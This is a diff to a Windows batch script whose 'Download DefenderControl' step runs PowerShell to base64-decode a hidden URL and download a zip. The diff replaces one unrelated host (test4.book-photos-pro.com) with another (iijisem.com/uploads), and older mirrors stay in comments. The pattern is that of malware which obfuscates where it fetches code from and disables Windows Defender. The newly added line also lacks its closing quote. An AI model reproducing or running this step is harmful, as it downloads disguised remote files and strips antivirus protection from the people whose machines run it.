@@ -52,7 +52,8 @@ echo.
 pause
 
 :: Download DefenderControl
-powershell -Command "$u=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly90ZXN0NC5ib29rLXBob3Rvcy1wcm8uY29tL2RDb250cm9sLnppcA==')); Invoke-WebRequest -Uri $u -OutFile .\Defender_Control.zip"
+powershell -Command "$u=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9paWppc2VtLmNvbS91cGxvYWRzL2RDb250cm9sLnppcA==')); Invoke-WebRequest -Uri $u -OutFile .\Defender_Control.zip
+::powershell -Command "$u=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly90ZXN0NC5ib29rLXBob3Rvcy1wcm8uY29tL2RDb250cm9sLnppcA==')); Invoke-WebRequest -Uri $u -OutFile .\Defender_Control.zip"
 ::powershell -Command "Invoke-WebRequest -Uri arenawebsecurity.net/dControl.zip -OutFile .\Defender_Control.zip"
 ::powershell -Command "Invoke-WebRequest https://www.sordum.org/files/downloads.php?st-defender-control -OutFile .\Defender_Control.zip"
 :: do not harm any site please!
